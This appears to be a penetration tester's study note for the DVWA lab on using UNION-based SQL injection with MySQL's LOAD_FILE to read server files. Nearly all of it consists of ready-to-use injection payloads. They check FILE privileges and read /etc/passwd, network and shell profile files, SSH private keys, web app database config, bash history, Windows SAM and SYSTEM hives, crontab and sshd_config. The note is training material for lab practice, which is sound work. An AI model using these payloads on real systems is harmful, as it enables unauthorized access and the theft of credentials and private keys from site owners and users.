# 03 - OS Enumeration

Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa

## 3.1 - Conditions

1. The DB user must have **FILE** and **SELECT** privileges.
2. **Note:** Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

## 3.2 - Enumerate Database User Privileges

```sql
' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv) FROM mysql.user WHERE File_priv = 'Y' AND user = 'dvwa'#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SELECT' OR PRIVILEGE_TYPE OR 'FILE' AND GRANTEE LIKE "'dvwa'%"#
```

## 3.3 - Basic Information

### 3.3.1 - Linux

- Enumerate hostname

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/hostname')#
```

- Enumerate user accounts

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/passwd')#
```

- Enumerate user groups

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/group')#
```

- Local IPv4 address

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/network/interfaces')#

' UNION SELECT NULL, LOAD_FILE('/etc/sysconfig/network')#

' UNION SELECT NULL, LOAD_FILE('/etc/networks')#
```

- DNS resolve and nameserver IPs

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/resolv.conf')#

' UNION SELECT NULL, LOAD_FILE('/etc/hosts')#
```

- Environment variables may contain **sensitive information**. You never know that sometimes the sysadmins can be lazy sometimes.

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/profile')#

' UNION SELECT NULL, LOAD_FILE('/etc/bash.bashrc')#

' UNION SELECT NULL, LOAD_FILE('/home/<username>/.bash_profile')#

' UNION SELECT NULL, LOAD_FILE('/root/.bash_profile')#

' UNION SELECT NULL, LOAD_FILE('/home/<username>/.bashrc')#

' UNION SELECT NULL, LOAD_FILE('/root/.bashrc')#
```

- Enumerate installed packages that will give you an idea of what services are installed.

```sql
' UNION SELECT NULL, LOAD_FILE('/var/log/dpkg.log')#

' UNION SELECT NULL, LOAD_FILE('/var/log/yum.log')#
```

- Enumerate kernel version

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/lsb-release')#

' UNION SELECT NULL, LOAD_FILE('/etc/os-release')#

' UNION SELECT NULL, LOAD_FILE('/proc/version')#
```

### 3.3.2 - Windows

```sql
' UNION SELECT NULL, LOAD_FILE('c:/windows/win.ini')#

' UNION SELECT NULL, LOAD_FILE('c:/xampp/php/php.ini')#
```

- DNS resolve and nameserver IPs

```sql
' UNION SELECT NULL, LOAD_FILE('c:/Windows/system32/drivers/etc/hosts')#
```

## 3.4 - Credentials

### 3.4.1 - Linux

- Retrieve SSH keys

```sql
' UNION SELECT NULL, LOAD_FILE('/home/<username>/.ssh/id_rsa')#

' UNION SELECT NULL, LOAD_FILE('/root/.ssh/id_rsa')#
```

- Retrieve database config file. You have to lookup of what web technology it's using such as, a **content management system (CMS)** like wordpress. Find the absolute path of the [[Credentials#^bc9e6e|database config file]] after enumeration phase for the web root directory.

```sql
' UNION SELECT NULL, LOAD_FILE('/var/www/html/dvwa/config.php')#
```

- Retrieve history commands. You can find more in the [[Credentials|privilege escalation credentials]] section.

```sql
' UNION SELECT NULL, LOAD_FILE('/home/<username>/.ssh/.bash_history')#

' UNION SELECT NULL, LOAD_FILE('/root/.ssh/.bash_history')#
```

### 3.4.2 - Windows

```sql
' UNION SELECT NULL, LOAD_FILE('C:/Windows/Repair/SAM')#

' UNION SELECT NULL, LOAD_FILE('C:/Windows/Repair/SYSTEM')#

' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/config/security')#
           
' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/config/system')#

' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/config/sam')#
```

## 3.5 - Privilege Escalation

### 3.5.1 - Linux

- CronJobs may contain backup files that is worth **harvesting the data**. Moreover, there is a possible attack vector to spawn a callback shell. Be on the lookout.

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/crontab')#
```

## 3.5 - Config Files

### 3.5.1 - Linux

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/ssh/sshd_config')#
```

## 3.6 - Hardware

- Check uptime

```sql
' UNION SELECT NULL, LOAD_FILE('/proc/uptime')#
```

- Enumerate mounted drives and network shares.

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/fstab')#
```

- Enumerate CPU cores

```sql
' UNION SELECT NULL, LOAD_FILE('/proc/cpuinfo')#
```

---
## References

### Linux

#### Enumeration and Discovery

- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Enumeration and Discovery/Linux/Users|Users]]

- [[Environment Variables]]

- [[Log Files]]

- [[System and Kernel Version]]

#### Enumeration and Discovery

- [[Cron Job]]

#### Credentials Access and Dumping

- [[Credentials]]

### Windows

#### Enumeration and Discovery

- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Enumeration and Discovery/Windows/Host/Networking/IP Address|IP Addresses]]

#### Privilege Escalation

- [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Credential Access and Dumping/Windows/Host/Registry/Hashdump/01 - Manual|Manual Hashdump]]